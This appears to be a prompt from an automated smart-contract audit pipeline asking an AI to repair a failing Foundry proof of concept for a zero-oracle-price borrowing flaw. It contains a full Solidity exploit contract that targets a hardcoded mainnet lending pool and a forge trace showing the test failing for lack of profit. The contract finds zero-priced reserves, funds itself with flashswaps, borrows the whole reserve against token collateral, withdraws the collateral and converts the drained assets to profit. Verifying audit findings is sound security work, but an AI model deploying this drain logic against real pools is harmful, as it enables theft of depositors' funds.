You are fixing a failing Foundry PoC for finding F-003.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Zero oracle prices make listed reserves borrowable for free
- claim: `AaveOracle.getAssetPrice` can return `0` when an asset has no configured source and the fallback oracle returns `0`, or when a configured source is non-positive and the fallback also returns `0`. `_executeBorrow` forwards that price directly into borrow validation, making `amountInETH` and the incremental collateral requirement for that borrowed asset equal to zero.
- impact: If any borrowable reserve resolves to a zero price, an attacker can post minimal valid collateral elsewhere and drain that reserve because the protocol records no additional debt value for the borrowed asset. The result is immediate reserve loss and protocol insolvency for that market.
- exploit_paths: ["A listed reserve's primary source is unset or unusable, and the fallback oracle also returns `0`.", "An attacker supplies enough collateral in another asset to satisfy general borrow preconditions.", "The attacker borrows the zero-priced reserve asset.", "Borrow validation treats the additional debt as worth zero and allows the reserve to be drained."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IPriceOracleLike {
    function getAssetPrice(address asset) external view returns (uint256);
}

interface ILendingPoolAddressesProviderLike {
    function getPriceOracle() external view returns (address);
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function totalSupply() external view returns (uint256);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function burn(address to) external returns (uint256 amount0, uint256 amount1);
}

library AaveDataTypes {
    struct ReserveConfigurationMap {
        uint256 data;
    }

    struct ReserveData {
        ReserveConfigurationMap configuration;
        uint128 liquidityIndex;
        uint128 variableBorrowIndex;
        uint128 currentLiquidityRate;
        uint128 currentVariableBorrowRate;
        uint128 currentStableBorrowRate;
        uint40 lastUpdateTimestamp;
        address aTokenAddress;
        address stableDebtTokenAddress;
        address variableDebtTokenAddress;
        address interestRateStrategyAddress;
        uint8 id;
    }
}

interface ILendingPoolLike {
    function deposit(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
    function withdraw(address asset, uint256 amount, address to) external returns (uint256);
    function borrow(address asset, uint256 amount, uint256 interestRateMode, uint16 referralCode, address onBehalfOf)
        external;
    function getReservesList() external view returns (address[] memory);
    function getReserveData(address asset) external view returns (AaveDataTypes.ReserveData memory);
    function getConfiguration(address asset) external view returns (AaveDataTypes.ReserveConfigurationMap memory);
    function getAddressesProvider() external view returns (ILendingPoolAddressesProviderLike);
}

contract FlawVerifier {
    uint256 private constant VARIABLE_RATE_MODE = 2;

    address private constant TARGET_POOL = 0x5F360c6b7B25DfBfA4F10039ea0F7ecfB9B02E60;

    address private constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address private constant SUSHI_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;

    enum PlanKind {
        None,
        TargetIsQuote,
        DirectSaleToQuote,
        BurnLpToQuote
    }

    struct TargetCandidate {
        address asset;
        uint256 availableLiquidity;
    }

    struct QuoteCandidate {
        address asset;
        uint256 minRequired;
        uint256 decimals;
        uint256 price;
    }

    struct FundingPlan {
        PlanKind kind;
        address targetAsset;
        uint256 targetBorrowAmount;
        address quoteAsset;
        uint256 collateralAmount;
        address fundingPair;
        address salePair;
        address auxAsset;
        uint256 expectedProfitQuote;
        uint256 expectedProfitValue;
    }

    address private _profitToken;
    uint256 private _profitAmount;

    constructor() {}

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function executeOnOpportunity() external {
        if (_profitAmount > 0) {
            return;
        }

        ILendingPoolLike pool = ILendingPoolLike(TARGET_POOL);
        address oracle = pool.getAddressesProvider().getPriceOracle();
        address[] memory reserves = pool.getReservesList();

        TargetCandidate memory liveTarget = _findBestZeroPriceTarget(pool, oracle, reserves);
        if (liveTarget.asset == address(0)) {
            // Fork-state refutation for F-003 at block 16384469:
            // the market only lists WBTC, USDC, and the 0x0043... LP reserve, and all three
            // resolve to strictly positive prices from AaveOracle.getAssetPrice(). Without a
            // listed zero-priced reserve, exploit path stage 1 is not live and later stages
            // cannot be executed without changing the hypothesis.
            return;
        }

        FundingPlan memory plan = _findBestPlan(pool, oracle, reserves, liveTarget);
        if (plan.kind == PlanKind.None) {
            return;
        }

        uint256 balanceBefore = _balanceOf(plan.quoteAsset, address(this));
        _startFlashswap(plan);

        uint256 realized = _netIncrease(plan.quoteAsset, balanceBefore);
        if (realized > 0) {
            _profitToken = plan.quoteAsset;
            _profitAmount = realized;
        }
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        require(sender == address(this), "bad sender");

        FundingPlan memory plan = abi.decode(data, (FundingPlan));
        require(msg.sender == plan.fundingPair, "bad pair");

        uint256 borrowedQuote = amount0 > 0 ? amount0 : amount1;
        require(borrowedQuote == plan.collateralAmount, "bad flash amount");

        ILendingPoolLike pool = ILendingPoolLike(TARGET_POOL);

        // Exploit path stage 2: post a tiny amount of valid collateral from public AMM liquidity.
        _forceApprove(plan.quoteAsset, TARGET_POOL, borrowedQuote);
        pool.deposit(plan.quoteAsset, borrowedQuote, address(this), 0);

        // Exploit path stage 3: borrow the listed reserve whose oracle price is zero.
        pool.borrow(plan.targetAsset, plan.targetBorrowAmount, VARIABLE_RATE_MODE, 0, address(this));

        // Additional public market step only for temporary-funding settlement: once the borrowed
        // reserve is valued at zero, this extra debt adds no collateral requirement, so the seed
        // collateral can be withdrawn and returned to the flashswap pair.
        pool.withdraw(plan.quoteAsset, type(uint256).max, address(this));

        if (plan.kind == PlanKind.DirectSaleToQuote) {
            _swapEntireBalance(plan.salePair, plan.targetAsset, plan.quoteAsset);
        } else if (plan.kind == PlanKind.BurnLpToQuote) {
            uint256 lpBalance = _balanceOf(plan.targetAsset, address(this));
            if (lpBalance > 0) {
                _forceTransfer(plan.targetAsset, plan.targetAsset, lpBalance);
                IUniswapV2PairLike(plan.targetAsset).burn(address(this));
            }

            if (plan.auxAsset != address(0)) {
                _swapEntireBalance(plan.salePair, plan.auxAsset, plan.quoteAsset);
            }
        }

        _forceTransfer(plan.quoteAsset, plan.fundingPair, _sameTokenFlashRepayAmount(plan.collateralAmount));
    }

    function _findBestPlan(
        ILendingPoolLike pool,
        address oracle,
        address[] memory reserves,
        TargetCandidate memory forcedTarget
    ) internal view returns (FundingPlan memory best) {
        for (uint256 j = 0; j < reserves.length; ++j) {
            QuoteCandidate memory quote = _buildQuoteCandidate(pool, oracle, reserves[j]);
            if (quote.asset == address(0)) {
                continue;
            }

            FundingPlan memory candidate = _buildTargetIsQuotePlan(forcedTarget, quote);
            if (candidate.expectedProfitValue > best.expectedProfitValue) {
                best = candidate;
            }

            candidate = _buildDirectSalePlan(forcedTarget, quote);
            if (candidate.expectedProfitValue > best.expectedProfitValue) {
                best = candidate;
            }

            candidate = _buildBurnLpPlan(forcedTarget, quote);
            if (candidate.expectedProfitValue > best.expectedProfitValue) {
                best = candidate;
            }
        }
    }

    function _findBestZeroPriceTarget(ILendingPoolLike pool, address oracle, address[] memory reserves)
        internal
        view
        returns (TargetCandidate memory best)
    {
        for (uint256 i = 0; i < reserves.length; ++i) {
            TargetCandidate memory candidate = _buildTargetCandidate(pool, oracle, reserves[i]);
            if (candidate.availableLiquidity > best.availableLiquidity) {
                best = candidate;
            }
        }
    }

    function _buildTargetIsQuotePlan(TargetCandidate memory target, QuoteCandidate memory quote)
        internal
        view
        returns (FundingPlan memory plan)
    {
        if (target.asset != quote.asset) {
            return plan;
        }

        address fundingPair = _findBestFundingPair(quote.asset, quote.minRequired, address(0));
        if (fundingPair == address(0)) {
            return plan;
        }

        uint256 repayAmount = _sameTokenFlashRepayAmount(quote.minRequired);
        if (target.availableLiquidity + quote.minRequired <= repayAmount) {
            return plan;
        }

        uint256 profitQuote = target.availableLiquidity + quote.minRequired - repayAmount;
        uint256 profitValue = _quoteValue(quote, profitQuote);
        if (profitValue == 0) {
            return plan;
        }

        plan.kind = PlanKind.TargetIsQuote;
        plan.targetAsset = target.asset;
        plan.targetBorrowAmount = target.availableLiquidity;
        plan.quoteAsset = quote.asset;
        plan.collateralAmount = quote.minRequired;
        plan.fundingPair = fundingPair;
        plan.expectedProfitQuote = profitQuote;
        plan.expectedProfitValue = profitValue;
    }

    function _buildDirectSalePlan(TargetCandidate memory target, QuoteCandidate memory quote)
        internal
        view
        returns (FundingPlan memory best)
    {
        if (target.asset == quote.asset) {
            return best;
        }

        address[2] memory factories = [UNISWAP_V2_FACTORY, SUSHI_FACTORY];
        for (uint256 i = 0; i < factories.length; ++i) {
            address salePair = _getPair(factories[i], target.asset, quote.asset);
            if (salePair == address(0)) {
                continue;
            }

            (uint256 reserveIn, uint256 reserveOut) = _reservesFor(salePair, target.asset, quote.asset);
            if (reserveIn == 0 || reserveOut == 0) {
                continue;
            }

            uint256 quoteOut = _getAmountOut(target.availableLiquidity, reserveIn, reserveOut);
            uint256 repayAmount = _sameTokenFlashRepayAmount(quote.minRequired);
            if (quoteOut + quote.minRequired <= repayAmount) {
                continue;
            }

            address fundingPair = _findBestFundingPair(quote.asset, quote.minRequired, salePair);
            if (fundingPair == address(0)) {
                continue;
            }

            uint256 profitQuote = quoteOut + quote.minRequired - repayAmount;
            uint256 profitValue = _quoteValue(quote, profitQuote);
            if (profitValue <= best.expectedProfitValue) {
                continue;
            }

            best.kind = PlanKind.DirectSaleToQuote;
            best.targetAsset = target.asset;
            best.targetBorrowAmount = target.availableLiquidity;
            best.quoteAsset = quote.asset;
            best.collateralAmount = quote.minRequired;
            best.fundingPair = fundingPair;
            best.salePair = salePair;
            best.expectedProfitQuote = profitQuote;
            best.expectedProfitValue = profitValue;
        }
    }

    function _buildBurnLpPlan(TargetCandidate memory target, QuoteCandidate memory quote)
        internal
        view
        returns (FundingPlan memory plan)
    {
        (bool ok, address token0, address token1) = _pairTokens(target.asset);
        if (!ok) {
            return plan;
        }

        if (quote.asset != token0 && quote.asset != token1) {
            return plan;
        }

        address fundingPair = _findBestFundingPair(quote.asset, quote.minRequired, target.asset);
        if (fundingPair == address(0)) {
            return plan;
        }

        IUniswapV2PairLike pair = IUniswapV2PairLike(target.asset);
        (uint112 reserve0_, uint112 reserve1_,) = pair.getReserves();
        uint256 reserve0 = uint256(reserve0_);
        uint256 reserve1 = uint256(reserve1_);
        uint256 totalSupply = pair.totalSupply();
        if (totalSupply == 0) {
            return plan;
        }

        bool quoteIsToken0 = quote.asset == token0;
        address auxAsset = quoteIsToken0 ? token1 : token0;
        uint256 quoteReserve = quoteIsToken0 ? reserve0 : reserve1;
        uint256 auxReserve = quoteIsToken0 ? reserve1 : reserve0;

        uint256 burnedQuote = (target.availableLiquidity * quoteReserve) / totalSupply;
        uint256 burnedAux = (target.availableLiquidity * auxReserve) / totalSupply;
        if (burnedQuote == 0 && burnedAux == 0) {
            return plan;
        }

        uint256 quoteFromSwap;
        if (burnedAux > 0 && burnedQuote < quoteReserve && burnedAux < auxReserve) {
            uint256 postBurnQuoteReserve = quoteReserve - burnedQuote;
            uint256 postBurnAuxReserve = auxReserve - burnedAux;
            if (postBurnQuoteReserve > 0 && postBurnAuxReserve > 0) {
                quoteFromSwap = _getAmountOut(burnedAux, postBurnAuxReserve, postBurnQuoteReserve);
            }
        }

        uint256 totalQuoteRealized = burnedQuote + quoteFromSwap;
        uint256 repayAmount = _sameTokenFlashRepayAmount(quote.minRequired);
        if (totalQuoteRealized + quote.minRequired <= repayAmount) {
            return plan;
        }

        uint256 profitQuote = totalQuoteRealized + quote.minRequired - repayAmount;
        uint256 profitValue = _quoteValue(quote, profitQuote);
        if (profitValue == 0) {
            return plan;
        }

        plan.kind = PlanKind.BurnLpToQuote;
        plan.targetAsset = target.asset;
        plan.targetBorrowAmount = target.availableLiquidity;
        plan.quoteAsset = quote.asset;
        plan.collateralAmount = quote.minRequired;
        plan.fundingPair = fundingPair;
        plan.salePair = target.asset;
        plan.auxAsset = auxAsset;
        plan.expectedProfitQuote = profitQuote;
        plan.expectedProfitValue = profitValue;
    }

    function _buildTargetCandidate(ILendingPoolLike pool, address oracle, address asset)
        internal
        view
        returns (TargetCandidate memory candidate)
    {
        if (asset == address(0) || asset.code.length == 0) {
            return candidate;
        }

        AaveDataTypes.ReserveConfigurationMap memory configuration;
        AaveDataTypes.ReserveData memory reserveData;

        try pool.getConfiguration(asset) returns (AaveDataTypes.ReserveConfigurationMap memory c) {
            configuration = c;
        } catch {
            return candidate;
        }

        uint256 configData = configuration.data;
        if (!_isActive(configData) || _isFrozen(configData) || !_isBorrowingEnabled(configData)) {
            return candidate;
        }

        try pool.getReserveData(asset) returns (AaveDataTypes.ReserveData memory r) {
            reserveData = r;
        } catch {
            return candidate;
        }

        if (reserveData.aTokenAddress == address(0) || reserveData.aTokenAddress.code.length == 0) {
            return candidate;
        }

        uint256 price;
        try IPriceOracleLike(oracle).getAssetPrice(asset) returns (uint256 p) {
            price = p;
        } catch {
            return candidate;
        }

        if (price != 0) {
            return candidate;
        }

        uint256 liquidity = _balanceOf(asset, reserveData.aTokenAddress);
        if (liquidity == 0) {
            return candidate;
        }

        candidate.asset = asset;
        candidate.availableLiquidity = liquidity;
    }

    function _buildQuoteCandidate(ILendingPoolLike pool, address oracle, address asset)
        internal
        view
        returns (QuoteCandidate memory candidate)
    {
        if (asset == address(0) || asset.code.length == 0) {
            return candidate;
        }

        AaveDataTypes.ReserveConfigurationMap memory configuration;
        try pool.getConfiguration(asset) returns (AaveDataTypes.ReserveConfigurationMap memory c) {
            configuration = c;
        } catch {
            return candidate;
        }

        uint256 configData = configuration.data;
        if (!_isActive(configData) || _isFrozen(configData) || _ltv(configData) == 0) {
            return candidate;
        }

        uint256 price;
        try IPriceOracleLike(oracle).getAssetPrice(asset) returns (uint256 p) {
            price = p;
        } catch {
            return candidate;
        }

        if (price == 0) {
            return candidate;
        }

        uint256 decimals = _decimals(configData);
        if (decimals > 77) {
            return candidate;
        }

        // Borrow validation only needs collateral balance in ETH to be strictly positive when the
        // newly borrowed asset is worth zero, so one minimal price-positive unit is sufficient.
        uint256 unit = 10 ** decimals;
        uint256 minRequired = _ceilDiv(unit, price);
        if (minRequired == 0) {
            minRequired = 1;
        }

        candidate.asset = asset;
        candidate.minRequired = minRequired;
        candidate.decimals = decimals;
        candidate.price = price;
    }

    function _findBestFundingPair(address quoteAsset, uint256 minRequired, address excludedPair)
        internal
        view
        returns (address bestPair)
    {
        address[2] memory factories = [UNISWAP_V2_FACTORY, SUSHI_FACTORY];
        address[5] memory bridges = [WETH, USDC, USDT, DAI, WBTC];
        uint256 bestLiquidity;

        for (uint256 i = 0; i < factories.length; ++i) {
            for (uint256 j = 0; j < bridges.length; ++j) {
                address bridge = bridges[j];
                if (bridge == quoteAsset) {
                    continue;
                }

                address pair = _getPair(factories[i], quoteAsset, bridge);
                if (pair == address(0) || pair == excludedPair) {
                    continue;
                }

                uint256 liquidity = _balanceOf(quoteAsset, pair);
                if (liquidity < minRequired) {
                    continue;
                }

                if (liquidity > bestLiquidity) {
                    bestLiquidity = liquidity;
                    bestPair = pair;
                }
            }
        }
    }

    function _startFlashswap(FundingPlan memory plan) internal {
        address token0 = IUniswapV2PairLike(plan.fundingPair).token0();
        address token1 = IUniswapV2PairLike(plan.fundingPair).token1();
        require(plan.quoteAsset == token0 || plan.quoteAsset == token1, "pair mismatch");

        bytes memory data = abi.encode(plan);
        uint256 amount0Out = plan.quoteAsset == token0 ? plan.collateralAmount : 0;
        uint256 amount1Out = plan.quoteAsset == token1 ? plan.collateralAmount : 0;
        IUniswapV2PairLike(plan.fundingPair).swap(amount0Out, amount1Out, address(this), data);
    }

    function _swapEntireBalance(address pair, address tokenIn, address tokenOut) internal returns (uint256 amountOut) {
        uint256 amountIn = _balanceOf(tokenIn, address(this));
        if (amountIn == 0) {
            return 0;
        }

        (uint256 reserveIn, uint256 reserveOut) = _reservesFor(pair, tokenIn, tokenOut);
        require(reserveIn > 0 && reserveOut > 0, "bad reserves");

        amountOut = _getAmountOut(amountIn, reserveIn, reserveOut);
        _forceTransfer(tokenIn, pair, amountIn);

        address token0 = IUniswapV2PairLike(pair).token0();
        uint256 amount0Out = tokenOut == token0 ? amountOut : 0;
        uint256 amount1Out = tokenOut == token0 ? 0 : amountOut;
        IUniswapV2PairLike(pair).swap(amount0Out, amount1Out, address(this), new bytes(0));
    }

    function _reservesFor(address pair, address tokenIn, address tokenOut)
        internal
        view
        returns (uint256 reserveIn, uint256 reserveOut)
    {
        IUniswapV2PairLike v2Pair = IUniswapV2PairLike(pair);
        address token0 = v2Pair.token0();
        address token1 = v2Pair.token1();
        require(
            (tokenIn == token0 && tokenOut == token1) || (tokenIn == token1 && tokenOut == token0),
            "token mismatch"
        );

        (uint112 reserve0, uint112 reserve1,) = v2Pair.getReserves();
        if (tokenIn == token0) {
            reserveIn = uint256(reserve0);
            reserveOut = uint256(reserve1);
        } else {
            reserveIn = uint256(reserve1);
            reserveOut = uint256(reserve0);
        }
    }

    function _getPair(address factory, address tokenA, address tokenB) internal view returns (address pair) {
        try IUniswapV2FactoryLike(factory).getPair(tokenA, tokenB) returns (address p) {
            pair = p;
        } catch {}

        if (pair == address(0) || pair.code.length == 0) {
            pair = address(0);
        }
    }

    function _pairTokens(address pair) internal view returns (bool ok, address token0, address token1) {
        try IUniswapV2PairLike(pair).token0() returns (address t0) {
            token0 = t0;
        } catch {
            return (false, address(0), address(0));
        }

        try IUniswapV2PairLike(pair).token1() returns (address t1) {
            token1 = t1;
        } catch {
            return (false, address(0), address(0));
        }

        ok = token0 != address(0) && token1 != address(0);
    }

    function _quoteValue(QuoteCandidate memory quote, uint256 amount) internal pure returns (uint256) {
        if (amount == 0 || quote.price == 0) {
            return 0;
        }

        return (amount * quote.price) / (10 ** quote.decimals);
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        (bool okReset, bytes memory dataReset) =
            token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, 0));
        require(okReset && (dataReset.length == 0 || abi.decode(dataReset, (bool))), "approve reset failed");

        (bool okSet, bytes memory dataSet) =
            token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        require(okSet && (dataSet.length == 0 || abi.decode(dataSet, (bool))), "approve failed");
    }

    function _forceTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
    }

    function _balanceOf(address token, address account) internal view returns (uint256 balance) {
        try IERC20Like(token).balanceOf(account) returns (uint256 b) {
            balance = b;
        } catch {}
    }

    function _netIncrease(address token, uint256 startingBalance) internal view returns (uint256) {
        uint256 endingBalance = _balanceOf(token, address(this));
        return endingBalance > startingBalance ? endingBalance - startingBalance : 0;
    }

    function _ceilDiv(uint256 x, uint256 y) internal pure returns (uint256) {
        return x == 0 ? 0 : ((x - 1) / y) + 1;
    }

    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        if (amountIn == 0 || reserveIn == 0 || reserveOut == 0) {
            return 0;
        }

        uint256 amountInWithFee = amountIn * 997;
        return (amountInWithFee * reserveOut) / (reserveIn * 1000 + amountInWithFee);
    }

    function _sameTokenFlashRepayAmount(uint256 amountOut) internal pure returns (uint256) {
        return ((amountOut * 1000) / 997) + 1;
    }

    function _ltv(uint256 configData) internal pure returns (uint256) {
        return configData & 0xFFFF;
    }

    function _decimals(uint256 configData) internal pure returns (uint256) {
        return (configData >> 48) & 0xFF;
    }

    function _isActive(uint256 configData) internal pure returns (bool) {
        return ((configData >> 56) & 1) != 0;
    }

    function _isFrozen(uint256 configData) internal pure returns (bool) {
        return ((configData >> 57) & 1) != 0;
    }

    function _isBorrowingEnabled(uint256 configData) internal pure returns (bool) {
        return ((configData >> 58) & 1) != 0;
    }
}

```

forge stdout (tail):
```
7B25DfBfA4F10039ea0F7ecfB9B02E60::getConfiguration(0x004375Dff511095CC5A197A54140a24eFEF3A416) [staticcall]
    │   │   ├─ [2794] 0x574FF39184Dee9e46F6C3229B95e0e0938e398d0::getConfiguration(0x004375Dff511095CC5A197A54140a24eFEF3A416) [delegatecall]
    │   │   │   └─ ← [Return] ReserveConfigurationMap({ data: 365398758549627788 [3.653e17] })
    │   │   └─ ← [Return] ReserveConfigurationMap({ data: 365398758549627788 [3.653e17] })
    │   ├─ [17718] 0x5F360c6b7B25DfBfA4F10039ea0F7ecfB9B02E60::getReserveData(0x004375Dff511095CC5A197A54140a24eFEF3A416) [staticcall]
    │   │   ├─ [17047] 0x574FF39184Dee9e46F6C3229B95e0e0938e398d0::getReserveData(0x004375Dff511095CC5A197A54140a24eFEF3A416) [delegatecall]
    │   │   │   └─ ← [Return] ReserveData({ configuration: ReserveConfigurationMap({ data: 365398758549627788 [3.653e17] }), liquidityIndex: 1009975369323648897472145498 [1.009e27], variableBorrowIndex: 1012836078907441799066405499 [1.012e27], currentLiquidityRate: 0, currentVariableBorrowRate: 0, currentStableBorrowRate: 0, lastUpdateTimestamp: 1669077227 [1.669e9], aTokenAddress: 0x68B26dCF21180D2A8DE5A303F8cC5b14c8d99c4c, stableDebtTokenAddress: 0xe84121241b92e26B9942dfF3CF3c9148FBaeC8F2, variableDebtTokenAddress: 0xcae229361B554CEF5D1b4c489a75a53b4f4C9C24, interestRateStrategyAddress: 0xeE11Ea16BD81287930C656f8f61b58D390c67D3B, id: 2 })
    │   │   └─ ← [Return] ReserveData({ configuration: ReserveConfigurationMap({ data: 365398758549627788 [3.653e17] }), liquidityIndex: 1009975369323648897472145498 [1.009e27], variableBorrowIndex: 1012836078907441799066405499 [1.012e27], currentLiquidityRate: 0, currentVariableBorrowRate: 0, currentStableBorrowRate: 0, lastUpdateTimestamp: 1669077227 [1.669e9], aTokenAddress: 0x68B26dCF21180D2A8DE5A303F8cC5b14c8d99c4c, stableDebtTokenAddress: 0xe84121241b92e26B9942dfF3CF3c9148FBaeC8F2, variableDebtTokenAddress: 0xcae229361B554CEF5D1b4c489a75a53b4f4C9C24, interestRateStrategyAddress: 0xeE11Ea16BD81287930C656f8f61b58D390c67D3B, id: 2 })
    │   ├─ [35237] 0x8A4236F5eF6158546C34Bd7BC2908B8106Ab1Ea1::getAssetPrice(0x004375Dff511095CC5A197A54140a24eFEF3A416) [staticcall]
    │   │   ├─ [29697] 0x849AF4b128be3317a694bFD262dEFF636AB84c1b::50d25bcd() [staticcall]
    │   │   │   ├─ [2504] 0x004375Dff511095CC5A197A54140a24eFEF3A416::getReserves() [staticcall]
    │   │   │   │   └─ ← [Return] 578680045 [5.786e8], 100949159688 [1.009e11], 1673440811 [1.673e9]
    │   │   │   ├─ [3143] 0xF4030086522a5bEEa4988F8cA5B36dbC97BeE88c::feaf968c() [staticcall]
    │   │   │   │   ├─ [1410] 0xAe74faA92cB67A95ebCAB07358bC222e33A34dA7::feaf968c() [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000076c3000000000000000000000000000000000000000000000000000001959956dc7b0000000000000000000000000000000000000000000000000000000063becde70000000000000000000000000000000000000000000000000000000063becde700000000000000000000000000000000000000000000000000000000000076c3
    │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000500000000000076c3000000000000000000000000000000000000000000000000000001959956dc7b0000000000000000000000000000000000000000000000000000000063becde70000000000000000000000000000000000000000000000000000000063becde700000000000000000000000000000000000000000000000500000000000076c3
    │   │   │   ├─ [3143] 0x8fFfFfd4AfB6115b954Bd326cbe7B4BA576818f6::feaf968c() [staticcall]
    │   │   │   │   ├─ [1410] 0x789190466E21a8b78b8027866CBBDc151542A26C::feaf968c() [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000031e0000000000000000000000000000000000000000000000000000000005f5e1000000000000000000000000000000000000000000000000000000000063be4ae30000000000000000000000000000000000000000000000000000000063be4ae3000000000000000000000000000000000000000000000000000000000000031e
    │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000002000000000000031e0000000000000000000000000000000000000000000000000000000005f5e1000000000000000000000000000000000000000000000000000000000063be4ae30000000000000000000000000000000000000000000000000000000063be4ae3000000000000000000000000000000000000000000000002000000000000031e
    │   │   │   ├─ [2388] 0x004375Dff511095CC5A197A54140a24eFEF3A416::totalSupply() [staticcall]
    │   │   │   │   └─ ← [Return] 5771992996 [5.771e9]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000bd7d1f13887ce69804
    │   │   └─ ← [Return] 3495450576387056244740 [3.495e21]
    │   └─ ← [Return]
    ├─ [329] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [325] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 35.91ms (3.52ms CPU time)

Ran 1 test suite in 215.51ms (35.91ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 225602)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
